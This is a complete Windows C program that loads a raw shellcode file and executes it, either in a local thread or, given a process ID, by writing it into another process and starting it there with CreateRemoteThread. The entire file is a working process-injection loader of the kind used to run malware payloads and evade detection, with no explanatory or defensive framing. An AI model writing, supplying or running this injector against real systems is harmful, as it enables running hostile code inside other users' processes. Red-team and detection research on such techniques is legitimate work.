#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <shellcode.bin> [pid]\n", argv[0]);
        return 1;
    }

    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open file: %lu\n", GetLastError());
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    printf("[*] File size: %lu bytes\n", fileSize);

    LPVOID mem = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) {
        printf("[!] VirtualAlloc failed: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    printf("[*] Allocated local memory at: %p\n", mem);

    DWORD bytesRead = 0;
    ReadFile(hFile, mem, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    printf("[*] Read %lu bytes\n", bytesRead);

    if (argc >= 3) {
        DWORD pid = (DWORD)strtoul(argv[2], NULL, 10);
        printf("[*] Injecting into PID %lu\n", pid);

        HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProc) {
            printf("[!] OpenProcess failed: %lu\n", GetLastError());
            VirtualFree(mem, 0, MEM_RELEASE);
            return 1;
        }

        LPVOID remoteMem = VirtualAllocEx(hProc, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteMem) {
            printf("[!] VirtualAllocEx failed: %lu\n", GetLastError());
            CloseHandle(hProc);
            VirtualFree(mem, 0, MEM_RELEASE);
            return 1;
        }
        printf("[*] Remote memory at: %p\n", remoteMem);

        SIZE_T written = 0;
        if (!WriteProcessMemory(hProc, remoteMem, mem, fileSize, &written)) {
            printf("[!] WriteProcessMemory failed: %lu\n", GetLastError());
            CloseHandle(hProc);
            VirtualFree(mem, 0, MEM_RELEASE);
            return 1;
        }
        printf("[*] Wrote %lu bytes\n", (unsigned long)written);

        DWORD oldProtect = 0;
        if (!VirtualProtectEx(hProc, remoteMem, fileSize, PAGE_EXECUTE_READ, &oldProtect)) {
            printf("[!] VirtualProtectEx failed: %lu\n", GetLastError());
            CloseHandle(hProc);
            VirtualFree(mem, 0, MEM_RELEASE);
            return 1;
        }

        HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
        if (!hThread) {
            printf("[!] CreateRemoteThread failed: %lu\n", GetLastError());
            CloseHandle(hProc);
            VirtualFree(mem, 0, MEM_RELEASE);
            return 1;
        }
        printf("[*] Remote thread created, waiting...\n");

        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        CloseHandle(hProc);
    } else {
        DWORD oldProtect = 0;
        VirtualProtect(mem, fileSize, PAGE_EXECUTE_READ, &oldProtect);

        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
        if (!hThread) {
            printf("[!] CreateThread failed: %lu\n", GetLastError());
            VirtualFree(mem, 0, MEM_RELEASE);
            return 1;
        }
        printf("[*] Thread created, waiting...\n");

        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    printf("[*] Done.\n");
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
